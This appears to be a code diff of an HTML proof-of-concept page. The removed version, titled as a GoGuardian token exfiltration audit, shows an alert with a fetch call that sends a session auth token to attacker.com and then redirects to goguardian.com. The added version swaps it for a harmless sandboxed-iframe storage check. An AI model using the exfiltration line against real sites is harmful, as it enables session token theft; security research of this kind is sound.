@@ -1,41 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>GoGuardian Security Audit - Token Exfiltration PoC</title>
+    <title>Sandbox Simulation</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
-        .box { border: 2px solid #ff4d4d; padding: 30px; display: inline-block; background: #2a2a2a; border-radius: 8px; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
-        h1 { color: #ff4d4d; }
-        code { background: #000; color: #00ff00; padding: 2px 5px; }
-        .btn { background: #ff4d4d; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
-        .btn:hover { background: #ff3333; }
+        body { font-family: sans-serif; padding: 40px; background: #f0f0f0; text-align: center; }
+        .container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        iframe { width: 100%; height: 300px; border: 2px dashed #ccc; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h1>🔓 Token Theft Simulator</h1>
-        <p>This page simulates a <b>Cross-Site Scripting (XSS)</b> attack.</p>
-        <p>If you were logged into GoGuardian, clicking below would execute <br> 
-           JavaScript in the <code>goguardian.com</code> context to read <code>sessionStorage</code>.</p>
-        
-        <!-- THE EXPLOIT -->
-        <button class="btn" onclick="triggerExploit()">EXECUTE PAYLOAD</button>
-    </div>
+    <div class="container">
+        <h1>Parent Page (The "Browser")</h1>
+        <p>The dashed box below is the <b>Google Sites Sandbox</b>.</p>
 
-    <script>
-        function triggerExploit() {
-            // In a real pentest, we redirect the user to the target with a malicious parameter
-            // or we use a 'javascript:' URI to bypass the source-origin sandbox.
-            
-            const targetUrl = "https://goguardian.com"; // Or any GoGuardian dashboard
-            
-            alert("ATTACK TRIGGERED\n\nThe next step would be to execute:\n\nfetch('https://attacker.com' + sessionStorage.getItem('auth_token'))");
-            
-            // Redirecting the user to prove we can control their navigation
-            window.location.href = targetUrl;
-        }
-    </script>
+        <!-- THIS IS WHAT GOOGLE SITES DOES -->
+        <iframe 
+            sandbox="allow-scripts" 
+            srcdoc="
+                <div style='font-family:sans-serif; text-align:center; padding:20px;'>
+                    <h2 style='color:red;'>⚠️ Sandboxed Iframe</h2>
+                    <p id='msg'>Checking access...</p>
+                    <script>
+                        try {
+                            const count = sessionStorage.length;
+                            document.getElementById('msg').innerHTML = '<b>Access Confirmed</b><br>Storage Items: ' + count;
+                        } catch(e) {
+                            document.getElementById('msg').innerHTML = '<b style=color:orange;>Blocked by Sandbox</b><br>Reason: Security Policy';
+                        }
+                    </script>
+                </div>
+            ">
+        </iframe>
+    </div>
 
 </body>
 </html>
